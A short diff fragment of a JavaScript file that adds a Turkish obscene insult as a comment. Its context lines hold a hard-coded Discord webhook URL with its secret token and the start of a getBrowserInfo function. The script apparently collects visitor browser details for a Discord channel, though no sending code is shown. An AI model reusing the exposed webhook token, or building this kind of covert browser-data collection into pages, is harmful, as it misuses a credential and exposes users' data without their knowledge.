@@ -1,6 +1,6 @@
 (function() {
     'use strict';
-    
+    // ananı sıkım
     const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1448770841633620128/wesmitFF_1bpQha0MNqHLk1Yp7raiT_UhKkB-hinry0-i3NkWaXQBwzEirx3IhIJaFif';
     
     function getBrowserInfo() {
